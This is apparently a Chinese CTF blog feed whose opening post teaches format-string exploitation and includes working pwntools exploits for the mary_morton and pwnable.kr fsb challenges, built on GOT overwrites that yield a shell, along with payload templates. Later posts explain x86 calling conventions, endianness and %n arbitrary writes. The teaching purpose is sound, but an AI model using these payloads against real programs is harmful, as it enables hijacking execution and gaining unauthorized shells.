class="line"><span class="keyword">int</span> sub_4008DA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">system</span><span class="params">(<span class="string">"/bin/cat ./flag"</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我写这道题的思路有两个：可以利用格式化串漏洞修改printf函数的got表，将其修改为system函数的plt，再次执行fsb函数时，输入/bin/sh，则可以拿到shell。<br>也可以修改_stack_chk_fail 的got表，将其修改为这个后门函数的地址，当执行Stackoverflow函数时，破坏掉canary，则会执行后门函数。<br>exp采用的是思路1：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="comment">#a=remote("111.198.29.45","31730")</span></span><br><span class="line"><span class="keyword">a</span>=<span class="built_in">process</span>(<span class="string">"./mary_morton"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./mary_morton"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">a</span>.recvuntil(<span class="string">"3. Exit the battle \n"</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">printf_got=elf.got[<span class="string">"printf"</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">"system"</span>]</span><br><span class="line">length2=<span class="built_in">len</span>(str(system_plt))</span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">8</span>-length2)+<span class="string">'%'</span>+str(system_plt<span class="number">-8</span>+length2)+<span class="string">'c'</span>+<span class="string">"%8$lln"</span>+p64(printf_got)</span><br><span class="line">print payload</span><br><span class="line"><span class="keyword">a</span>.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="keyword">a</span>.recv()</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"2"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="keyword">a</span>.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="keyword">a</span>.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="格式化串不在栈中："><a href="#格式化串不在栈中：" class="headerlink" title="格式化串不在栈中："></a>格式化串不在栈中：</h3><p>某些时候你输入的格式化串不是保存在栈中的，这些字符串可能保存在bss段或者堆中，那么你使用多少%p，都不能找到你写入的格式化串。例如：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">   <span class="built_in">printf</span>(a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里的字符串a，就是全局变量，保存在bss段。<br><img src="/2019/02/22/格式化串漏洞利用总结/7.png" alt=""><br>不管你用多少%p，都找不到这个格式化串。<br>这样就需要找个跳板——栈中保存的EBP/RBP。</p><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>当函数初始化完成后(对汇编函数调用过程不了解请看原先笔记)，在当前函数栈帧中，EBP指向上一个函数栈帧的EBP，即saved EBP。如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/8.png" alt=""><br>那么就可以将saved ebp指向的内存修改为你想要修改的内存单元的地址。即第一次利用格式化串漏洞，将想要修改的内存单元的指针写入栈中。<br>例如，你想修改某个函数的got表项，第一次修改后如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/9.png" alt=""><br>因为saved ebp 本来就保存在栈中，且当前EBP和printf的参数——格式化串的距离是固定不变的，所以可以直接使用 <code>%number$n</code>找到saved ebp，将saved ebp指向的内存单元修改掉。<br>又因为上一个函数的EBP，即当前函数的栈帧中保存的saved ebp，和printf的参数也是固定不变的，所以第二次利用格式化串找到第一次修改的地址，即可修改目标，如图所示：<br><img src="/2019/02/22/格式化串漏洞利用总结/10.png" alt=""><br>图中的4和9，都是随便写的，具体数值需要根据题目调试出来。</p><p>利用模板如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次漏洞利用：</span><br><span class="line">payload='%'+str(想要修改的内存单元的地址)+‘c’+‘%offset1$n’</span><br><span class="line">offset1= 格式化串和EBP的偏移</span><br><span class="line"><span class="section">第二次漏洞利用:</span></span><br><span class="line">payload='%'+str(想要修改的数值)+‘c’+<span class="string">"%offset2$n"</span></span><br><span class="line">offset2= 格式化串和saved ebp的偏移</span><br></pre></td></tr></table></figure></p><p>其中第一次漏洞利用是将地址写入栈中，第二次才是真正的修改。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>pwnable.kr 中的fsb，就是格式化串不在栈中的。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;alloca.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> buf2[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsb</span><span class="params">(<span class="keyword">char</span>** argv, <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* args[]=&#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span>*** pargv = &amp;argv;</span><br><span class="line"><span class="keyword">char</span>*** penvp = &amp;envp;</span><br><span class="line">        <span class="keyword">char</span>** arg;</span><br><span class="line">        <span class="keyword">char</span>* c;</span><br><span class="line">        <span class="keyword">for</span>(arg=argv;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">        <span class="keyword">for</span>(arg=envp;*arg;arg++) <span class="keyword">for</span>(c=*arg; *c;c++) *c=<span class="string">'\0'</span>;</span><br><span class="line">*pargv=<span class="number">0</span>;</span><br><span class="line">*penvp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me some format strings(%d)\n"</span>, i+<span class="number">1</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf); <span class="comment">//漏洞在这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wait a sec...\n"</span>);</span><br><span class="line">        sleep(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"key : \n"</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf2, <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> pw = strtoull(buf2, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">if</span>(pw == key)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">                execve(args[<span class="number">0</span>], args, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect key \n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>( fd==<span class="number">-1</span> || read(fd, &amp;key, <span class="number">8</span>) != <span class="number">8</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">alloca(<span class="number">0x12345</span> &amp; key);<span class="comment">//在栈中申请空间，申请的大小是随机化的</span></span><br><span class="line">fsb(argv, envp); <span class="comment">// exploit this format string bug!</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用思路就是将sleep函数的got表项修改为execve(“/bin/sh”,0,0)的地址。<br>百度了一下alloca这个函数，是在栈中申请空间，类似于malloc，由于这个申请的栈空间的大小是不一定的，也就是说fsb这个函数栈帧的基地址EBP和ESP都是不确定的，则需要通过泄露栈中数据计算出offset。<br>在printf处下个断点。<br><img src="/2019/02/22/格式化串漏洞利用总结/12.png" alt=""><br>此时esp指向的是格式化字符串。<br>通过泄露图中0xfffeccf8所指向的内容再减去80，即可算出ESP，再泄露出saved ebp，两者相减再除以4，即可算出offset。<br>对应的payload的如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br></pre></td></tr></table></figure></p><p>完整的exp如下：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">p=ssh(host='pwnable.kr',port=2222,user='fsb',password='guest').run('/home/fsb/fsb')</span><br><span class="line">sleep_got=0x0804a008</span><br><span class="line">system=0x080486ab</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(1)\n"</span>) <span class="comment">#第一次利用，计算offset</span></span><br><span class="line">payload=<span class="string">"%14$08x%18$08x"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">esp=int(p.recv(8),16)-0x50</span><br><span class="line">ebp=int(p.recv(8),16)</span><br><span class="line">offset=(ebp-esp)/4</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(2)\n"</span>)</span><br><span class="line">payload=<span class="string">"%134520840c"</span>+<span class="string">"%18$n"</span> <span class="comment">#修改saved ebp所指向的内容为sleep表项地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(3)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAA%134514344c"</span>+<span class="string">"%"</span>+str(offset)+<span class="string">"$n"</span> <span class="comment">#修改为getshell的地址</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"(4)\n"</span>)</span><br><span class="line">payload=<span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;p&gt;这篇笔记总结下格式化字符串漏洞的利用。看之前需要对基本格式化字符串漏洞原理有所了解，在先前的笔记中已有。&lt;br&gt;格式化字符串漏洞的利
      
    
    </summary>
    
    
      <category term="pwnable" scheme="http://yoursite.com/tags/pwnable/"/>
    
      <category term="fmtstr" scheme="http://yoursite.com/tags/fmtstr/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编 函数调用</title>
    <link href="http://yoursite.com/2019/02/11/x86%E6%B1%87%E7%BC%96-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/"/>
    <id>http://yoursite.com/2019/02/11/x86汇编-函数调用/</id>
    <published>2019-02-11T09:05:59.000Z</published>
    <updated>2019-02-11T09:12:13.127Z</updated>
    
    <content type="html"><![CDATA[<p>函数调用一般有个模板。</p><pre><code>push ebpmov ebp,esp//这里提升堆栈sub esp,0x40  //这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。push edipush esipush ebx//保留现场lea edi, dword ptr ss:[ebp-0x40]mov ecx,0x10mov eax,0xccccccccrep stos dowrd ptr es:[edi]//填充缓冲区----------------这里是写函数的功能----------------    pop ebx    pop esi    pop edi    //恢复现场    mov esp,ebp    pop ebp    ret</code></pre><p>执行完上面代码，堆栈图差不多就是这个样子，（该图，下面是高址，上面是低址）<br>中间的ccc….就是填充缓冲区。填充后可以用来写入局部变量。<br>EBP后面的高址，存有恢复用的EIP，和call函数前push的参数。<br>EBP前面的低址，用来存局部变量。</p><p><img src="/2019/02/11/x86汇编-函数调用/1.png" alt=""></p><hr><p>根据函数调用约定的不同，平衡堆栈的方式不同<br>如果是__cedcl约定，是在母函数中平衡堆栈，就是函数调用完返回后，在调用者的函数体内 add esp，xx 来平衡堆栈。<br>例如母函数体内：<br> <code>push xx call 子函数 add esp,0x4</code></p><p>有几种函数调用约定，不同的调用约定，参数的传递，堆栈的平衡方式不同。下面是三种常见的调用约定：<br><strong>__cedcl 约定</strong><br>参数从右往左，依次入栈。堆栈平衡在母函数中完成。<br>在函数调用前，将参数压栈。<br><code>push xxxpush xxx...然后call 函数。//函数执行完毕add esp ，xx//在母函数中平衡堆栈</code></p><p><strong>stdcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈。<br>参数还是在调用前push 入栈。<br>平衡堆栈时，在 子函数 ret 后加个 xx  恢复堆栈<br>例如 ret   0x8，相当于 pop eip     add esp，0x8 </p><p><strong>fastcall 约定</strong><br>参数从右往左依次入栈，在子函数中 平衡堆栈<br>参数1个或者两个用 寄存器 传参，多于两个，多余两个的部分还是压栈传参。<br>例如  func(int a,int b,int c)<br><code>push cmov eax,bmov ecx,a</code><br>然后再call 函数，最后在子函数中平衡堆栈。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;函数调用一般有个模板。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;push ebp
mov ebp,esp
//这里提升堆栈
sub esp,0x40  
//这里是开辟缓冲区，不同编译器开辟的缓冲区大小不同。
push edi
push esi
push ebx
//保留现场
lea
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>深入理解little-endian</title>
    <link href="http://yoursite.com/2019/02/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3little-endian/"/>
    <id>http://yoursite.com/2019/02/11/深入理解little-endian/</id>
    <published>2019-02-11T08:59:32.000Z</published>
    <updated>2019-02-11T09:02:28.476Z</updated>
    
    <content type="html"><![CDATA[<p>little-endian 简单来说即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。</p><p>首先，明确一点，最小的单元都是字节；数据在内存中的存放是以字节为单位的。字节内的内容<strong>没有</strong>所谓的高位高址，低位低址。</p><p>在内存中存放数据时，先将这个数据拆分为一个一个的字节。再将高位字节放在高址，低位字节放低址。</p><p>要注意内存数据（数据在内存中实际位置）和 数值数据（实际应用的数值）的区别。真实内存中数据的存放是高位放高址，低位放低址。 而变为数值数据时是从高位到低位连起来的，例如 原本数据是int a=0x12345678，而实际放在内存中是  78 56 34 12 ，将其作为数值应用时，要将高位从低位连起来。更直观点是这样的。</p><p><img src="/2019/02/11/深入理解little-endian/1.png" alt=""></p><p>再来看看数值数据是如何转变的。</p><p><img src="/2019/02/11/深入理解little-endian/2.png" alt=""></p><p>内存中真实存储情况是这样的，但是应用为数据时（即这一格代表的数是多少）要从高址到低址读，即EBP-4这一格代表的数据是12345678。<br>在一些调试器上，例如ollydbg中，显示一格对应的数据时，一般已经转化为应用数据了（例如OD的堆栈窗口），而不是内存中的真实存储情况，这一点要清楚。</p><p>还需要清楚知道的是little-endian的存放机制的对象是<strong>单个元素的数值在内存的存放</strong>。 <em>对数组的元素的存放需要区别。</em></p><p><strong>数组的寻址公式是 ：首元素的地址+ n * 数组单个元素所占字节数。</strong>所以数组的存放是高位的<strong>元素</strong>在低址，低位的<strong>元素</strong>在高址。这里要和单个元素的存放区别开。<br>例如 char a[5]=”abcde”;<br>则元素在内存中的存储是</p><p><img src="/2019/02/11/深入理解little-endian/3.png" alt=""></p><p>再例如 int a[3]={0xaabbccdd,0xbbccddee,0xccddeeff};<br>则在内存中存储是</p><p><img src="/2019/02/11/深入理解little-endian/4.png" alt=""></p><p>这两个例子中都是真实存储情况，不是应用数值。<br>后者这个例子中，每个元素的存储方式还是按照little-endian的方式存储。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;little-endian 简单来说即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。&lt;/p&gt;
&lt;p&gt;首先，明确一点，最小的单元都是字节；数据在内存中的存放是以字节为单位的。字节内的内容&lt;strong&gt;没有&lt;/strong&gt;所谓的高位高址，低位低址。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基本格式化字符串漏洞原理</title>
    <link href="http://yoursite.com/2019/02/11/%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2019/02/11/基本格式化字符串漏洞原理/</id>
    <published>2019-02-11T08:42:00.000Z</published>
    <updated>2019-02-26T12:26:37.566Z</updated>
    
    <content type="html"><![CDATA[<p>理解这个漏洞的原理，你需要有汇编层面的函数调用和函数的参数传递知识。如果你不清楚函数的参数是如何传递的，可以看《加密与解密》的逆向分析技术篇。</p><p>再说格式化字符串漏洞之前，先了解一下printf函数和利用该漏洞的重要 格式化字符串%n，利用他可以做到几乎任意内存写入。</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><p>int printf (“格式化字符串”,参量… )<br>函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。<br>参量表中参数的个数是不定的（<em>如何实现参数的个数不定，可以参考《程序员的自我修养》这本书</em>），可以是一个，可以是两个，三个…..，<strong>也可以没有参数</strong>。<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。<br>但是有个不常见的格式化字符串 <strong>%n</strong> ，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。</p><p><strong>除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。</strong> 注意是指针指向的地方开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟 程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，地址的长度是不同的。</p><p>具体实例：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/1.png" alt=""></p><p>%n之前打印了5个a，所以n的值变成了5。</p><p>了解了这些后就可以说下格式化字符串漏洞了。</p><h3 id="漏洞成因和基本原理"><a href="#漏洞成因和基本原理" class="headerlink" title="漏洞成因和基本原理"></a>漏洞成因和基本原理</h3><p>正确使用printf是这样的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">5</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但也有人会懒省事，写成这样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[]=<span class="string">"neuqcsa"</span>;</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实参与函数形参的结合顺序是从左往右依次进行的，所以上面的代码也能输出：</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/2.png" alt=""></p><p>上面的代码不会有什么问题，但是如果将字符串的输入权交给用户就会有问题了。看下面的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户输入的字符串是”%x%x%x”，则会输出以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/3.png" alt=""></p><p>输出的结果是 内存中的数据。</p><p>看一下调用printf函数后的堆栈图：（cdecl调用方式，参数从右往左依次入栈）</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/4.png" alt=""></p><p>在OD中可以清晰的看到：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/5.png" alt=""></p><p><strong>这是因为printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。</strong></p><p>所以尽管没有参数，上面的代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><h3 id="任意内存的读取及任意内存写入："><a href="#任意内存的读取及任意内存写入：" class="headerlink" title="任意内存的读取及任意内存写入："></a>任意内存的读取及任意内存写入：</h3><p> 任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。</p><p>在说任意内存的读取之前要知道 <strong>局部变量是存储在栈中</strong>，这点很关键。所以一定可以找到我们所输入的格式化字符串。<br>例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">  <span class="built_in">printf</span>(a);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到以下结果<br><img src="/2019/02/11/基本格式化字符串漏洞原理/6.png" alt=""></p><p>看下堆栈图：<br>这是调用scanf函数前的堆栈图。</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/7.png" alt=""></p><p>输入字符串后的堆栈图：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/8.png" alt=""></p><p>调用printf函数的过程：</p><pre><code>mov eax，数组首地址push eax  call printf</code></pre><p>该过程只是将数组的首地址入栈，此时堆栈图如下。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/9.png" alt=""><br>所以在格式化字符串里用很多的%x 就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p><p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br>%&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br>但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化串开始的第一个，应该是%7 $n.</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/10.png" alt=""></p><p>图中是第六个参数是41414141。</p><p><img src="/2019/02/11/基本格式化字符串漏洞原理/11.png" alt=""></p><p>同样可以得到41414141。这样就方便的多了。</p><h4 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h4><p>有了上面内容的铺垫就可以学任意读取了：<br>看下面的代码：<br><img src="/2019/02/11/基本格式化字符串漏洞原理/12.png" alt=""></p><p>从命令行输入字符串后，将该字符串复制到a内，再直接打印a；<br>输入的字符串的前4个字节如果是一个有效的字符串的首地址，就可以用%s将其打印出来，做到任意内存读取。如果不是有效的字符串，会出现段错误。<br><img src="/2019/02/11/基本格式化字符串漏洞原理/13.png" 